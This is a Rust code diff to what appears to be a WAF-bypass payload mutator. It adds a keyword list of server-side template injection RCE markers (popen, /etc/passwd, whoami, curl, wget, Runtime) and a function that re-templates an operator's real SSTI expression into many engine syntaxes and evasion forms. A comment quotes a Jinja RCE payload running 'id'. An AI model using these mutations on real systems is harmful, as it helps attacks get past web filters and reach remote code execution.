@@ -128,6 +128,19 @@ pub fn mutate(payload: &str) -> Vec<String> {
         return Vec::new();
     }
 
+    // ANTI-RIG: a structured SSTI carries an RCE / data-exfil
+    // expression (`__globals__…popen('id')`, `T(java.lang.Runtime)`,
+    // `freemarker…Execute`). Dumping the canned `{{7*7}}` engine-probe
+    // library for it discards the exploit and ships a mere *detection*
+    // probe — the de-rigged bench would then claim "RCE bypassed the
+    // WAF" when only `7*7` was ever sent. Re-template the operator's
+    // ACTUAL expression into every engine's delimiters instead. A bare
+    // `{{7*7}}` / `{{user}}` probe is NOT structured: there the canned
+    // engine library IS the correct engine-fingerprinting product.
+    if is_structured_ssti(payload) {
+        return structured_ssti_mutate(payload);
+    }
+
     let mut results = BTreeSet::new();
     let rules = get_rules();
 
@@ -285,6 +298,137 @@ pub fn get_engine_payloads(engine_name: &str) -> Vec<String> {
         .find(|e| e.name.eq_ignore_ascii_case(engine_name))
         .map(|e| e.payloads.iter().map(|p| p.payload.clone()).collect())
         .unwrap_or_default()
+}
+
+/// True when the payload's value is a *concrete RCE / data-exfil*
+/// expression, not a bare engine-detection probe. `{{7*7}}` / `${7*7}`
+/// / `{{user}}` are demonstrators — the canned engine library is their
+/// correct equivalent. `{{cycler.__init__.__globals__.os.popen('id')}}`
+/// is an exploit: replacing it with `{{7*7}}` throws it away.
+pub(crate) fn is_structured_ssti(payload: &str) -> bool {
+    let lc = payload.to_ascii_lowercase();
+    const STRUCTURED: &[&str] = &[
+        ".__class__",
+        "__globals__",
+        "__subclasses__",
+        "__mro__",
+        "__init__",
+        "__builtins__",
+        "__import__",
+        "''.__",
+        "().__",
+        "[].__",
+        "popen",
+        "subprocess",
+        "os.system",
+        "system(",
+        ".read()",
+        "lipsum",
+        "cycler",
+        "request.application",
+        "config.items",
+        "config.__",
+        "|attr(",
+        "getruntime",
+        "runtime",
+        "processbuilder",
+        "freemarker.template.utility.execute",
+        "execute\")",
+        "t(java",
+        "t(org",
+        "getclass(",
+        "reflect",
+        "import os",
+        "exec(",
+        "eval(",
+        "scriptengine",
+        "javax.script",
+        "new (\"",
+        "#set($",
+        "$class.inspect",
+        "/etc/passwd",
+        "cat /",
+        "whoami",
+        "id;",
+        "curl ",
+        "wget ",
+    ];
+    STRUCTURED.iter().any(|m| lc.contains(m))
+}
+
+/// Pull the operator's actual template expression out of its
+/// delimiters so it can be re-templated into other engines.
+fn extract_template_expr(payload: &str) -> Option<String> {
+    for (open, close) in [
+        ("{{", "}}"),
+        ("{%", "%}"),
+        ("${", "}"),
+        ("#{", "}"),
+        ("<%", "%>"),
+        ("@{", "}"),
+    ] {
+        if let Some(o) = payload.find(open) {
+            let after = &payload[o + open.len()..];
+            if let Some(c) = after.find(close) {
+                let mut expr = after[..c].trim();
+                expr = expr.trim_start_matches('=').trim();
+                if !expr.is_empty() {
+                    return Some(expr.to_string());
+                }
+            }
+        }
+    }
+    None
+}
+
+/// Structured-SSTI path: re-template the operator's REAL expression
+/// into every engine's syntax + evasion shapes, then enforce that each
+/// surviving variant still carries the expression (chokepoint). The
+/// SSTI analogue of the XSS / SQL anti-rig gates.
+fn structured_ssti_mutate(payload: &str) -> Vec<String> {
+    let mut out: BTreeSet<String> = BTreeSet::new();
+    // The attack exactly as written is always a valid candidate.
+    out.insert(payload.trim().to_string());
+
+    if let Some(e) = extract_template_expr(payload) {
+        for v in [
+            format!("{{{{{e}}}}}"),        // {{ EXPR }}
+            format!("{{{{ {e} }}}}"),      // spaced
+            format!("{{{{\t{e}}}}}"),      // tab evasion
+            format!("{{{{{e}|safe}}}}"),   // jinja |safe
+            format!("{{%print({e})%}}"),   // jinja statement form
+            format!("${{{e}}}"),           // freemarker / mako
+            format!("#{{{e}}}"),           // velocity / pug
+            format!("<%= {e} %>"),         // erb / ejs
+            format!("<%={e}%>"),           // erb tight
+            format!("{{{e}}}"),            // smarty single-brace
+            format!("${{{{{e}}}}}"),       // ${{ EXPR }}
+            format!("#set($x={e})$x"),     // velocity assign-exec
+            format!("{{{{{e}}}}}\u{200b}"), // zero-width suffix
+        ] {
+            out.insert(v);
+        }
+    }
+
+    // Chokepoint: every variant MUST still carry the exploit. Tokens =
+    // alnum runs ≥4 of the inner expression; a variant carrying none
+    // is no longer this attack.
+    if let Some(e) = extract_template_expr(payload) {
+        let markers: Vec<String> = e
+            .to_ascii_lowercase()
+            .split(|c: char| !c.is_ascii_alphanumeric())
+            .filter(|t| t.len() >= 4 && t.chars().any(|c| c.is_ascii_alphabetic()))
+            .map(str::to_string)
+            .collect();
+        if !markers.is_empty() {
+            out.retain(|v| {
+                let lc = v.to_ascii_lowercase();
+                markers.iter().any(|m| lc.contains(m.as_str()))
+            });
+        }
+    }
+
+    out.into_iter().collect()
 }
 
 #[cfg(test)]
